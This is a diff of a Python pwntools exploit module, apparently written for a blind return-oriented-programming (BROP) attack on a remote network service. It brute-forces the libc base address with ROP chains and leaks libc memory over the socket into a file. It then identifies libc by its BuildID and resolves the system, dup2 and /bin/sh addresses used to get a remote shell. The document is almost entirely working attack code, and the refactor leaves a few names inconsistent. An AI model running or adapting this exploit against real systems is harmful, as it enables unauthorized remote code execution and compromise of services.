@@ -1,154 +1,160 @@
 #!/usr/bin/python3
 
-from pwn import *
+from pwn import pwnlib, ELF, p64, u64
 from subprocess import PIPE, Popen
+from time import sleep
 import sys
 
-from argsprint import *
+import print_tools as pt
 
-##### LIBCBASE #####--------------------------------------------------------------------------------
+# SYNTAX COLOURS AND system DATA:
 
-def getLibcBase(ExploitStructure):
 
-    BEGIN   = ExploitStructure.beginning()
 
-    LIBCOFFSET  = -0x384000 
-    return(p64(u64(ExploitStructure.BINBASE) + LIBCOFFSET))
-    
-    # v v v v v  PARTIE INUTILE UNE FOIS L'ADRESSE DE LA BASE DETERMINEE  v v v v v
-    LIBCBASE    = u64(ExploitStructure.BINBASE) - 0x1000
-    COUNT       = 0
 
-    BROP7   = p64(u64(ExploitStructure.BROPGADGET) + 0x7)
-    BROP9   = p64(u64(ExploitStructure.BROPGADGET) + 0x9)
-    R15     = b'JUNKJUNK'
+##### libc_base #####--------------------------------------------------------------------------------
 
-    LEN     = 0x10  # RDX
-    SOCKET  = 0x4   # RDI
-    
-    for i in range(LIBCBASE, 0, -0x1000):
+def get_libc_base(ExploitStructure):
 
-        COUNT += 1
-        r = ExploitStructure.remoteConnect()
+	begin	= ExploitStructure.beginning()
 
-        #JUNK       = r.recv()      # "Enter your choice"
-            
-        ROPCHAIN    = BROP7 + p64(i) + R15 + BROP9 + p64(SOCKET) + LEAKADR
-        PAYLOAD     = BEGIN + ROPCHAIN
+	libc_offset	= -0x384000	
+	return(p64(u64(ExploitStructure.bin_base) + libc_offset))
+	
+	# v v v v v  PARTIE INUTILE UNE FOIS L'ADRESSE DE LA base DETERMINEE  v v v v v
+	libc_base 	= u64(ExploitStructure.bin_base) - 0x1000
+	count		= 0
 
-        print(CPUR + '[-] Tested base address : ' + hex(i) + CEND, end='\r')
+	brop_7	= p64(u64(ExploitStructure.bropgadget) + 0x7)
+	brop_9	= p64(u64(ExploitStructure.bropgadget) + 0x9)
+	r_15		= b'junkjunk'
 
-        r.send(PAYLOAD)
-        sleep(DODO)
+	length		= 0x10	# RDX
+	socket	= 0x4	# RDI
+	
+	for i in range(libc_base, 0, -0x1000):
 
-        #--------------------
-        RESP    = r.recv()
+		count += 1
+		r = ExploitStructure.remoteConnect()
 
-        if b'ELF' in RESP:
-            printDone("Libc based found at : {}".format(hex(i)))
-            printDone("Offset from the binary base address is : {}".format(hex(COUNT * -0x1000)))
-            printLight("Update getLibcBase() function !")
-            r.close()
-            LIBCBASE = i    # dans le cas d'un binaire non remappe (donc avec
-            continue        # des adresses ne commençant pas par 0xf7f___...
+		#junk		= r.recv()		# "Enter your choice"
+			
+		ropchain	= brop_7 + p64(i) + r_15 + brop_9 + p64(socket) + leak_adr
+		payload 	= begin + ropchain
 
-        try:
-            r.close()
-        except:
-            pass
+		print(pt.cpur + '[-] Tested base address : ' + hex(i) + pt.cend, end='\r')
+
+		r.send(payload)
+		sleep(ExploitStructure.dodo)
+
+		#--------------------
+		resp	= r.recv()
+
+		if b'ELF' in resp:
+			print(cver + "[+] Libc based found at : {}".format(hex(i)) + pt.cend)
+			print(cver + "[+] Offset from the binary base address is : {}".format(hex(count * -0x1000)) + pt.cend)
+			print(pt.cjau + "[!] --> Update getLibcBase() function !" + pt.cend)
+			r.close()
+			libc_base = i	# dans le cas d'un binaire non remappe (donc avec
+			continue		# des adresses ne commençant pas par 0xf7f___...
+
+		try:
+			r.close()
+		except:
+			pass
 
 
 ####################--------------------------------------------------------------------------------
 
-##### LEAK LIBC #####-------------------------------------------------------------------------------
+##### LEAK libc #####-------------------------------------------------------------------------------
 
-def leakStuff(ExploitStructure) :   # Permet de fuiter n'importe quoi ; en gros, sert a faire des tests
+def leakStuff(ExploitStructure):	# Permet de fuiter n'importe quoi ; en gros, sert a faire des tests
 
-    BEGIN   = ExploitStructure.beginning()
-    i       = u64(ExploitStructure.LIBCBASE)
+	begin	= ExploitStructure.beginning()
+	i		= u64(ExploitStructure.libc_base)
 
-    BROP7   = p64(u64(ExploitStructure.BROPGADGET) + 0x7)
-    BROP9   = p64(u64(ExploitStructure.BROPGADGET) + 0x9)
-    R15     = b'JUNKJUNK'
+	brop_7	= p64(u64(ExploitStructure.brop_gadget) + 0x7)
+	brop_9	= p64(u64(ExploitStructure.brop_gadget) + 0x9)
+	r_15		= b'junkjunk'
 
-    LEN     = 0x10  # RDX
-    SOCKET  = 0x4   # RDI
-    
-    FILE    = open("LEAKEDLIBC", "wb")
-    LEN     = 0x1
+	length		= 0x10	# RDX
+	socket	= 0x4	# RDI
+	
+	file	= open("LEAKEDLIBC", "wb")
+	length		= 0x1
 
-    printInfo("Leaking first 0x600 bytes of Libc...")
+	print(pt.cjau + '[:] Leaking first 0x600 bytes of Libc...' + pt.cend)
 
-    while (i < u64(ExploitStructure.LIBCBASE)+0x601):
+	while (i < u64(ExploitStructure.libc_base)+0x601):
 
-        r = ExploitStructure.remoteConnect()
+		r = ExploitStructure.remoteConnect()
 
-        JUNK        = r.recv()      # "Enter your choice"
-            
-        ROPCHAIN    = BROP7 + p64(i) + R15 + BROP9 + p64(SOCKET) + ExploitStructure.LEAKADR
-        PAYLOAD     = BEGIN + ROPCHAIN
+		junk		= r.recv()		# "Enter your choice"
+			
+		ropchain	= brop_7 + p64(i) + r_15 + brop_9 + p64(socket) + ExploitStructure.leak_adr
+		payload 	= begin + ropchain
 
-        r.sendline(PAYLOAD)
-        sleep(DODO)
+		r.sendline(payload)
+		sleep(ExploitStructure.dodo)
 
-        JUNK    = r.recvline()
+		junk	= r.recvline()
 
-        try:
-            RESP    = r.recvall()
-        except:
-            continue
+		try:
+			resp	= r.recvall()
+		except:
+			continue
 
-        LEN = len(RESP)
-        if len(RESP) == 0:
-            RESP    = b'\x00'
-            LEN     = 1
+		length = len(resp)
+		if len(resp) == 0:
+			resp	= b'\x00'
+			length 	= 1
 
-        i += LEN
-        print(CPUR + '[-] Offset : ' + hex(i) + CEND, end='\r')
-        FILE.write(RESP)
-        FILE.flush()
+		i += length
+		print(pt.cpur + '[-] Offset : ' + hex(i) + pt.cend, end='\r')
+		file.write(resp)
+		file.flush()
 
-        try:
-            r.close()
-        except:
-            pass
+		try:
+			r.close()
+		except:
+			pass
 
-    FILE.close()
+	file.close()
 
+#####################-------------------------------------------------------------------------------
 
 ##### Symboles #####--------------------------------------------------------------------------------
 
 def getSymboles(ExploitStructure):
 
-    BASE = u64(ExploitStructure.LIBCBASE)
+	base = u64(ExploitStructure.libc_base)
 
-    if not ExploitStructure.NOLIBLEAK:
-        cmd = 'readelf -n LEAKEDLIBC | grep BUILD_ID -A1'
-        try:
-            printInfo("Getting BuildID...")
-            p = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)
-            stdout, stderr = p.communicate()
-            ExploitStructure.BUILDID = (stdout.decode("utf-8")).split(': ')[1].strip("\x0A")
-            # ATTENTION, visiblement on peut avoir besoin de : ExploitStructure.BUILDID = (stdout.decode("utf-8")).split('tion: ')[1].strip("\x0A")
-            printDone("BuildID   :   " + ExploitStructure.BUILDID) 
+	if not ExploitStructure.no_lib_leak and not ExploitStructure.build_id:
+		cmd = 'readelf -n LEAKEDLIBC | grep BUILD_ID -A1'
+		try:
+			print(pt.cjau + "[:] Getting BuildID..." + pt.cend)
+			p = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)
+			stdout, stderr = p.communicate()
+			ExploitStructure.build_id = (stdout.decode("utf-8")).split('tion: ')[1].strip("\x0A")
+			print(pt.cver + "[+] BuildID   :	" + ExploitStructure.build_id) 
 
-        except IndexError:
-            printError("Can't get BuildID : problem with the leaked libc")
-            exit(2)
-        except Exception as e:
-            printError("Can't get BuildID ; exception information : " + str(e))
-            exit(2)
+		except IndexError:
+			print(pt.cred + "[!] Can't get BuildID : problem with the leaked libc" + pt.cend)
+			exit(pt.cjau + "[:] Exploitation interruption..." + pt.cend)
+		except Exception as e:
+			print(pt.cred + "[!] Can't get BuildID ; exception information : " + pt.cend + str(e))
+			exit(pt.cjau + "[:] Exploitation interruption..." + pt.cend)
 
-    try:
-        LIBC = ELF(pwnlib.libcdb.search_by_build_id(ExploitStructure.BUILDID))
-    except TypeError:
-        printError("Error with the given BuildID")
-        exit(2)
+	try:
+		libc = ELF(pwnlib.libcdb.search_by_build_id(ExploitStructure.build_id))
+	except TypeError:
+		print(pt.cred + "[!] Error with the given BuildID" + pt.cend)
+		exit(pt.cjau + "[:] Exploitation interruption..." + pt.cend)
 
-    SYSTEM  = p64(BASE + LIBC.symbols.system)
-    DUP2    = p64(BASE + LIBC.symbols.dup2)
-    BINSH   = p64(BASE + next(LIBC.search(b'/bin/sh\x00')))
+	system	= p64(base + libc.symbols.system)
+	dup2	= p64(base + libc.symbols.dup2)
+	binsh	= p64(base + next(libc.search(b'/bin/sh\x00')))
 
-    return SYSTEM, DUP2, BINSH
+	return system, dup2, binsh
 
 
